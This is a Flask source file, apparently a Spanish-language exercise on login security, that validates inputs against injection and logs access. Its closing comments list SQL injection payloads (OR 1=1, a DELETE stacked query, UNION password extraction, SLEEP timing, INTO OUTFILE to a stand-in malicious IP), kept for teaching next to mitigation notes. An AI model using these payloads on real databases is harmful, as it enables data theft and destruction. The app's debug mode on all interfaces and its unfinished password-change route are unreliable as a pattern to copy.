from flask import Flask, jsonify,request,render_template
import json
from flask_mysqldb import MySQL
from utils.Utilitarios import Auditor,Utiles
from datetime import datetime

app=Flask(__name__)
app.config['MYSQL_HOST'] = 'localhost'
app.config['MYSQL_USER'] = 'prueba'
app.config['MYSQL_PASSWORD'] = 'prueba'
app.config['MYSQL_DB'] = 'ejemplo'
mysql = MySQL(app)


Au=Auditor()

@app.route("/")
def Raiz():
    fecha=datetime.now()
    fe=str(fecha.year)+str(fecha.month)+str(fecha.day)
    
    return render_template("login.html")
@app.route("/v",methods=['POST'])
def Raiz1():
    if request.method == 'POST':
        usua = request.form.get('usua')
        pw = request.form.get('pw')
        Utiles.Inyeccion(usua,'usuario')
        Utiles.Inyeccion(pw,'clave')
        # if not Utiles.ConsistenciaClave(pw):
        #     print("No cumple")
        try:
            app.config['MYSQL_HOST'] = 'localhost'
            app.config['MYSQL_USER'] = usua
            app.config['MYSQL_PASSWORD'] = pw
            app.config['MYSQL_DB'] = 'hr'
            cur = mysql.connection.cursor()
            # cur.execute("select count(*) from regions")
            # cadena=cur.fetchall()
            # return render_template("region.html", cadena=cadena)
            msgito="BIENVENIDO"
            regreso="/paso1"
            # logger.error('INFO: ingresa '+usua)
            Au.registra(30,msgito,usua )
            return render_template("alerta.html", msgito=msgito,regreso=regreso)
        except Exception as e:
            msgito="USUARIO O CREDENCIALES NO VALIDOS"
            regreso="/"
            usua=''
            Au.registra(40,msgito,app.config['MYSQL_USER'])
            
            return render_template("alerta.html", msgito=msgito,regreso=regreso)

    return usua

@app.route("/paso1")
def Paso1():
    try:
        cur = mysql.connection.cursor()
        return render_template("paso1.html")
    except Exception as e:
        msgito="NO HA VALIDADO CREDENCIALES <paso1>"
        regreso="/"
        # logger.error('ERROR: '+msgito+' ')
        Au.registra(40,msgito,'')
        return render_template("alerta.html", msgito=msgito,regreso=regreso)


@app.route("/cpw")
def cpwd():
    return render_template("clogin.html")
@app.route("/cpw1",methods=['POST'])
def cpwd1():
    try:
        if request.method == 'POST':
            pw1 = request.form.get('pw1')
            app.config['MYSQL_PASSWORD'] = pw1
            cur = mysql.connection.cursor()
    except Exception as e:
        msgito="CLAVE ANTERIOR NO COINCIDE <CPWD>"
        regreso="/"        
        return render_template("alerta.html", msgito=msgito,regreso=regreso)
    
    
    if request.method == 'POST':
        pw2 = request.form.get('pw2')
        pw3 = request.form.get('pw3')
        if pw2 == pw3:
            pass
            # app.config['MYSQL_PASSWORD'] = pw1
            # cur = mysql.connection.cursor()
            # msgito="OK  <CPWD>"
            # regreso="/"        
            # return render_template("alerta.html", msgito=msgito,regreso=regreso)
        else:
            msgito="CLAVES NO COINCIDEN"
            regreso="/"        
            return render_template("alerta.html", msgito=msgito,regreso=regreso)
    if not Utiles.ConsistenciaClave(pw2):
        msgito="Error: No cumple con las condiciones:\nAl menos Una Mayuscula, \nUn numero, Una minuscular,\n un caracter especial,\n una longitud minima de 8 caracteres"
        regreso="/"
        return render_template("alerta.html", msgito=msgito,regreso=regreso)

@app.route("/region")
def Region():
    try:
        cur = mysql.connection.cursor()
        cur.execute("select * from regions")
        cadena=cur.fetchall()

        Au.registra(30,'Ingresa a regions ',app.config['MYSQL_USER'])
        
        return render_template("region.html",cadena=cadena)
    except Exception as e:
        msgito="NO TIENE ACCESO <region>"
        regreso="/paso1"
        Au.registra(40,msgito,'')
        
        return render_template("alerta.html", msgito=msgito,regreso=regreso) 
# ' OR 1=1 --
# ';DELETE FROM USUARIOS;
# mm' UNION select contraseña from usuario where usuario='migma' --

# select * from user_table where
# username = 'admin';--' and password = 'mypassword'

# select * from user_table where
# username = 'admin' and
# password = 'password' or 1=1;--';

# select title, link from post_table
# where id < 10
# union
# select username, password
# from user_table; --;

# select * from comments
# WHERE post_id=1-SLEEP(15);

# select * from post_table
# into OUTFILE '\\MALICIOUS_IP_ADDRESSlocation'

# Escapar las Entradas del Usuario
# Utilizar Sentencias Preparadas
# error403 Forbidden

# https://learn.microsoft.com/es-es/sql/relational-databases/security/sql-injection?view=sql-server-ver16
# https://latam.kaspersky.com/resource-center/definitions/sql-injection

if __name__=='__main__':
    app.run(debug=True,port=8000,host='0.0.0.0')